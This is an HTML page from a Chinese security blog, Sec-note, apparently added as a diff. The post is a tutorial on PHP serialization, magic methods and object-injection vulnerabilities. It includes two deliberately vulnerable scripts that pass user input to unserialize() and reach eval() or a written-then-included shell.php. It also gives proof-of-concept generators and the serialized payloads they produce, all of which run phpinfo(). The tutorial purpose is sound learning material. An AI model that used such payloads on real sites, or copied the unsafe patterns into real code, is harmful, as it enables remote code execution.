@@ -1,0 +1,1006 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="PHP反序列化学习整理。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP反序列化">
+<meta property="og:url" content="http://yoursite.com/2017/09/11/PHP反序列化/index.html">
+<meta property="og:site_name" content="Sec-note">
+<meta property="og:description" content="PHP反序列化学习整理。">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//17-9-29/62475027.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//17-9-29/17175231.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-4-11/13964682.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-4-11/5998660.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-4-11/5650092.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-4-11/36492604.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-4-12/99020558.jpg">
+<meta property="og:updated_time" content="2018-04-12T03:24:18.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="PHP反序列化">
+<meta name="twitter:description" content="PHP反序列化学习整理。">
+<meta name="twitter:image" content="http://opmi2ydgh.bkt.clouddn.com//17-9-29/62475027.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2017/09/11/PHP反序列化/"/>
+
+
+
+
+
+  <title>PHP反序列化 | Sec-note</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Sec-note</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/11/PHP反序列化/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Sec-note">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sec-note">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">PHP反序列化</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-09-11T18:13:23+08:00">
+                2017-09-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><code>PHP</code>反序列化学习整理。</p>
+<a id="more"></a>
+<h5 id="20170926-PHP反序列化"><a href="#20170926-PHP反序列化" class="headerlink" title="20170926 PHP反序列化"></a>20170926 PHP反序列化</h5><h5 id="序列化和发序列化"><a href="#序列化和发序列化" class="headerlink" title="序列化和发序列化"></a>序列化和发序列化</h5><p><strong><a href="http://php.net/manual/zh/function.serialize.php" target="_blank" rel="noopener">序列化_serialize</a></strong></p>
+<pre><code>string serialize(mixed $value)
+</code></pre><blockquote>
+<p>serialize 产生一个可存储的值的表示。serialize()返回字符串，此字符串包含了value的字节流，可以存储于任何地方。这样有利于存储或传递PHP的值，同时不丢失其类型和结构。<br>PHP将试图在序列化动作之前调用对象成员函数__sleep()&gt;这样就允许对象在被序列化之前做任何清除操作。</p>
+</blockquote>
+<p>代码：</p>
+<pre><code>    &lt;?php
+class secnote{
+    var $test = &apos;sec-note&apos;;
+}
+$class1 = new secnote;
+$class1_ser = serialize($class1);
+print_r($class1_ser);
+?&gt;
+</code></pre><p><img src="http://opmi2ydgh.bkt.clouddn.com//17-9-29/62475027.jpg" alt=""></p>
+<pre><code>O:7:&quot;secnote&quot;:1:{s:4:&quot;test&quot;;s:8:&quot;sec-note&quot;;}
+</code></pre><p>其中的O代表的是存储的是对象(object).7代表对象的名称有7个字符，<code>secnote</code>表示对象的名称，1表示有一个值，<code>{s:4:&quot;test&quot;;s:8:&quot;sec-note&quot;;}</code>中，s表示字符串，4表示其中的长度，’test’ 表示字符串的名称。</p>
+<p><strong><a href="http://php.net/manual/zh/function.unserialize.php" target="_blank" rel="noopener">反序列化unserialize</a></strong></p>
+<blockquote>
+<p>unserialize对单一的已序列化的变量进行操作，将其转换会PHP的值。</p>
+</blockquote>
+<p>代码</p>
+<pre><code>&lt;?php
+
+class secnote{
+    var $test = &apos;sec-note&apos;;
+}
+$class2 = &apos;O:7:&quot;secnote&quot;:1:{s:4:&quot;test&quot;;s:8:&quot;sec-note&quot;;}&apos;;
+print_r($class2);
+echo &quot;&lt;/br&gt;&quot;;
+
+$class2_unser = unserialize($class2);
+print_r($class2_unser);
+
+
+?&gt;
+</code></pre><p><img src="http://opmi2ydgh.bkt.clouddn.com//17-9-29/17175231.jpg" alt=""></p>
+<pre><code>O:7:&quot;secnote&quot;:1:{s:4:&quot;test&quot;;s:8:&quot;sec-note&quot;;}
+secnote Object ( [test] =&gt; sec-note )
+</code></pre><p>unserialize() 会检查是否存在一个 <strong>wakeup() 方法。如果存在，则会先调用 </strong>wakeup 方法，预先准备对象需要的资源。</p>
+<h5 id="类和魔术方法"><a href="#类和魔术方法" class="headerlink" title="类和魔术方法"></a>类和魔术方法</h5><p>创建一个正常的类，一个变量以及方法，实例化对象。</p>
+<p>以下<code>test.php</code></p>
+<pre><code>&lt;?php
+class Secnote{
+    public $a = &quot;test&quot;;
+    public function iprint()
+    {
+        echo $this-&gt;a;
+    }
+}
+
+//实例化一个对象
+$b = new Secnote();
+
+//调用方法
+$b-&gt;iprint();
+?&gt;
+</code></pre><p><img src="http://opmi2ydgh.bkt.clouddn.com//18-4-11/13964682.jpg" alt=""></p>
+<p>上面是一个正常的实例化和方法的调用过程。有一些<a href="https://secure.php.net/manual/zh/language.oop5.magic.php" target="_blank" rel="noopener">魔术方法</a>在特定的情况下会自动调用。</p>
+<p><code>PHP</code> 将所有以 <code>__</code>（两个下划线）开头的类方法保留为魔术方法。</p>
+<pre><code>__construct() 方法在每次创建新对象时会被自动调用
+
+__destruct() 方法在使用 exit() 终止脚本运行时也会被自动调用
+
+__toString() 方法在一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。
+</code></pre><p>在类里面增加这三个方法。<code>__construct()， __destruct(), __toString()</code></p>
+<pre><code>&lt;?php
+class Secnote{
+    public $a = &quot;test&quot;;
+    public function iprint()
+    {
+        echo $this-&gt;a . &apos;&lt;br/&gt;&apos;;
+    }
+    //构造函数
+    public function __construct()
+    {
+        echo &quot;This is construct &lt;br/&gt;&quot;;
+    }
+    //析构函数
+    public function __destruct()
+    {
+        echo &quot;This is destruct &lt;br/&gt;&quot;;
+    }
+    public function __toString()
+    {
+        return &quot;This is toString &lt;br/&gt;&quot;;
+    }
+}
+
+//实例化一个对象时，__construct会被调用
+$b = new Secnote();
+
+//调用方法
+$b-&gt;iprint();
+// 对象被当作字符串时，__toString被调用
+echo $b;
+//脚本结束时，__destruct被调用
+?&gt;
+</code></pre><p>结果</p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-4-11/5998660.jpg" alt=""></p>
+<p>序列化和反序列化时的魔术方法。<code>__sleep()</code>和<code>__wakeup</code></p>
+<pre><code>__sleep()： serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。
+__wakeup： unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。
+</code></pre><p>测试和序列化有关的魔术函数。</p>
+<pre><code>&lt;?php
+class Secnote{
+    public $a = &quot;test1&quot;;
+    public $b = &quot;test2&quot;;
+    public function iprint()
+    {
+        echo $this-&gt;a . &apos;&lt;br/&gt;&apos;;
+    }
+    //构造函数
+    public function __construct()
+    {
+        echo &quot;This is construct &lt;br/&gt;&quot;;
+    }
+    //析构函数
+    public function __destruct()
+    {
+        echo &quot;This is destruct &lt;br/&gt;&quot;;
+    }
+    public function __wakeup()
+    {
+        echo &quot;This is __wakeup&lt;br/&gt;&quot;;
+    }
+    public function __sleep()
+    {
+        echo &quot;This is __sleep&lt;br/&gt;&quot;;
+        return array(&apos;a&apos;,&apos;b&apos;); //返回一个包含对象中所有应被序列化的变量名称的数组
+    }
+}
+
+//实例化一个对象时，__construct会被调用
+$c = new Secnote();
+// 序列化对象调用__sleep
+$serialized = serialize($c);
+// 输出序列化之后的字符串
+print &quot;Serialized: &quot; . $serialized . &apos;&lt;br/&gt;&apos;;
+// 反序列化调用 __wakeup
+$d = unserialize($serialized);
+// 调用方法输出数据
+$d -&gt;iprint();
+//执行结束调用 __destruct
+
+?&gt;
+</code></pre><p>结果</p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-4-11/5650092.jpg" alt=""></p>
+<h5 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h5><p>反序列化参数可控，<code>unserialize()</code>反序列化后会直接调用<code>__wakeup()</code>或<code>__destruct()</code>，这时魔术方法，本身就存在的。如果你重写了这些魔术方法，且其中存在漏洞，使用可控的序列化参数构造<code>payload</code>去触发这个漏洞。</p>
+<p>参考<a href="https://zhuanlan.zhihu.com/p/33426188" target="_blank" rel="noopener">案例一</a></p>
+<p>反序列化漏洞需要满足的条件。</p>
+<ol>
+<li>程序中存在序列化字符串的输入点 (该输入点序列化字符串可被反序列化)</li>
+<li>程序中存在可以利用的魔术函数</li>
+</ol>
+<p>可发序列化的代码</p>
+<p>存在输入点，<code>data</code>参数，并且树反序列化操作的。 </p>
+<p><code>unser.php</code></p>
+<pre><code>&lt;?php
+    class example{
+        public $handle;
+        function __destruct()         //析构函数，脚本调用结束时执行，
+        {
+            $this-&gt;shutdown(); // 调用了类中的shutdown()   
+        }
+        public function shutdown()
+        {
+            $this-&gt;handle-&gt;close();  //调用某个地方的close()函数
+        }
+    }
+    class process{
+        public $pid;
+        function close()
+        {
+            eval($this-&gt;pid);  //存在漏洞函数，但参数不可控
+        }
+    }
+    if(isset($_GET[&apos;data&apos;])){
+        $user_data = unserialize(urldecode($_GET[&apos;data&apos;])); 
+    //data参数可控，进行反序列化
+    // $user_data 反序列话之后的对象
+    }
+?&gt;
+</code></pre><p>这个可控点和上面的构造方法，联合一下，构造漏洞。这段代码两个类，一个<code>example</code>和<code>process</code>，在<code>process</code>中一个函数<code>close()</code>，其中危险函数<code>eval()</code>，但是参数不可控，无法执行任意代码。在<code>example</code>类中有一个<code>__destruct</code>析构函数，在脚本执行结束的时候执行，且调用可一个成员函数<code>shutdown()</code>，其作用是调用某个地方的<code>close()</code>函数。</p>
+<p>可以去调用<code>process</code>类中的<code>close()</code>函数且<code>$pid</code>变量可控。</p>
+<p>需要在反序列化的时候<code>$handle</code>是<code>process</code>类的一个实例化对象，<code>$pid</code>是想要执行的任意代码。</p>
+<p>序列化代码 <code>POC</code></p>
+<p><code>ser.php</code></p>
+<pre><code>&lt;?php
+    class example{
+        public $handle;
+        function __construct()
+        {
+            $this-&gt;handle = new process();  // handle是类process 实例化的一个对象
+        }
+    }
+    class process {
+        public $pid;
+        function __construct()
+        {
+            $this-&gt;pid = &apos;phpinfo();&apos;;
+        }
+    }
+    $test = new example();
+    echo urlencode(serialize($test));
+</code></pre><p>生成序列化之后的<code>payload</code>。</p>
+<pre><code>O%3A7%3A%22example%22%3A1%3A%7Bs%3A6%3A%22handle%22%3BO%3A7%3A%22process%22%3A1%3A%7Bs%3A3%3A%22pid%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D
+</code></pre><p>在可控参数上输入<code>payload</code>。</p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-4-11/36492604.jpg" alt=""></p>
+<p>序列化的字符串进行反序列化时就会安照设定生成一个<code>example</code>类实例化，这时候已经反序列化之后了，按照<code>unser.php</code>文件中的代码逻辑执行，脚本结束后自动调用<code>__destruct()</code>函数，然后调用<code>shutdown()</code>函数，此时<code>$handle</code>为类<code>process</code>的类实例化对象，所以接下来会调用<code>process</code>的<code>close()</code>函数，<code>eval()</code>就会执行，其中的<code>pid</code>在<code>POC</code>代码中的构造函数中已经设置，造成了代码执行。</p>
+<p>攻击线路称为<code>ROP(（Return-oriented programming）)</code>面向返回编程：</p>
+<p><a href="https://www.owasp.org/images/9/9e/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf" target="_blank" rel="noopener">Utilizing Code Reuse/ROP in PHP Application Exploits - owasp</a></p>
+<blockquote>
+<p>其核心思想是在整个进程空间内现存的函数中寻找适合代码片断（gadget），并通过精心设计返回代码把各个gadget拼接起来，从而达到恶意攻击的目的。构造ROP攻击的难点在于，我们需要在整个进程空间中搜索我们需要的gadgets，这需要花费相当长的时间。但一旦完成了“搜索”和“拼接”，这样的攻击是无法抵挡的，因为它用到的都是程序中合法的的代码，普通的防护手段难以检测。</p>
+</blockquote>
+<p>参考<a href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">案例二</a></p>
+<p>存在反序列化的代码</p>
+<pre><code>&lt;?php
+class secnote {
+    var $a = &apos;test&apos;;
+    function __wakeup(){    //反序列化自动调用
+        $fp = fopen(&quot;shell.php&quot;,&quot;w&quot;);
+        fwrite($fp,$this-&gt;a);
+        fclose($fp);
+
+    }
+}
+$b = $_GET[&apos;id&apos;];
+print_r($b);
+echo &quot;&lt;/br&gt;&quot;;
+$d = unserialize($b);
+
+require &quot;shell.php&quot;;
+
+?&gt;
+</code></pre><p>构造<code>POC</code>，生成<code>payload</code>。</p>
+<pre><code>&lt;?php
+class secnote {
+    var $a = &apos;test&apos;;
+
+}
+$b = new secnote();
+$b-&gt;a = &quot;&lt;?php phpinfo(); ?&gt;&quot;;
+$b_ser = serialize($b);
+print_r($b_ser);
+?&gt;
+</code></pre><p>序列化的结果</p>
+<pre><code>O:7:&quot;secnote&quot;:1:{s:1:&quot;a&quot;;s:19:&quot;&lt;?php phpinfo(); ?&gt;&quot;;}
+</code></pre><p>利用</p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-4-12/99020558.jpg" alt=""></p>
+<p>其他的利用方法，有时候在<code>__wakeup()</code>或者析构函数中不存在漏洞，但是它又调用了其他的对象，向上溯源，利用一次次的<code>gadget</code>找到漏洞点。</p>
+<blockquote>
+<p>Makes use of POP (Property-oriented Programming) chains<br>Similar to ROP; reuse existing code (POP gadgets)</p>
+</blockquote>
+<h5 id="序列化文章"><a href="#序列化文章" class="headerlink" title="序列化文章"></a>序列化文章</h5><p><a href="http://www.notyeat.com/2018/03/26/php-unserialize/" target="_blank" rel="noopener">最通俗易懂的PHP反序列化分析</a></p>
+<p><a href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">浅谈php反序列化漏洞</a></p>
+<p><a href="https://www.anquanke.com/post/id/86452" target="_blank" rel="noopener">PHP反序列化漏洞</a></p>
+<p><a href="https://www.anquanke.com/post/id/84705" target="_blank" rel="noopener">神奇的php反序列化</a></p>
+<p><a href="https://www.anquanke.com/post/id/84922" target="_blank" rel="noopener">PHP反序列化漏洞成因及漏洞挖掘技巧与案例</a></p>
+<p><a href="https://paper.seebug.org/39/" target="_blank" rel="noopener">SugarCRM v6.5.23 PHP反序列化对象注入漏洞分析</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/32553774" target="_blank" rel="noopener">PHP反序列化漏洞详细教程及实例（上）</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/32601669" target="_blank" rel="noopener">PHP反序列化漏洞详细教程及实例（下） Typecho 反序列化漏洞分析</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/33426188" target="_blank" rel="noopener">由Typecho 深入理解PHP反序列化漏洞</a></p>
+<p><a href="https://zh.wikipedia.org/wiki/%E8%BF%94%E5%9B%9E%E5%AF%BC%E5%90%91%E7%BC%96%E7%A8%8B" target="_blank" rel="noopener">ROP 面向返回编程</a></p>
+<p><a href="http://spd.dropsec.xyz/2016/12/02/ROP%E7%B3%BB%E7%BB%9F%E6%94%BB%E5%87%BB%E6%80%9D%E6%83%B3/" target="_blank" rel="noopener">ROP系统攻击思想</a></p>
+<p><a href="https://www.owasp.org/images/9/9e/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf" target="_blank" rel="noopener">Utilizing Code Reuse/ROP in PHP Application Exploits - owasp</a></p>
+<p><a href="https://www.insomniasec.com/downloads/publications/Practical%20PHP%20Object%20Injection.pdf" target="_blank" rel="noopener">PPT–Practical PHP Object Injection - Insomnia Security</a></p>
+<p><a href="https://www.ei.rub.de/media/emma/veroeffentlichungen/2014/09/10/POPChainGeneration-CCS14.pdf" target="_blank" rel="noopener">Code Reuse Attacks in PHP:Automated POP Chain Generation</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/09/04/Flask表单/" rel="next" title="Flask 表单">
+                <i class="fa fa-chevron-left"></i> Flask 表单
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/09/19/python_class/" rel="prev" title="Python 类">
+                Python 类 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Sec-note</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">60</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/sie504" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-5"><a class="nav-link" href="#20170926-PHP反序列化"><span class="nav-number">1.</span> <span class="nav-text">20170926 PHP反序列化</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#序列化和发序列化"><span class="nav-number">2.</span> <span class="nav-text">序列化和发序列化</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#类和魔术方法"><span class="nav-number">3.</span> <span class="nav-text">类和魔术方法</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#反序列化漏洞"><span class="nav-number">4.</span> <span class="nav-text">反序列化漏洞</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#序列化文章"><span class="nav-number">5.</span> <span class="nav-text">序列化文章</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Sec-note</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
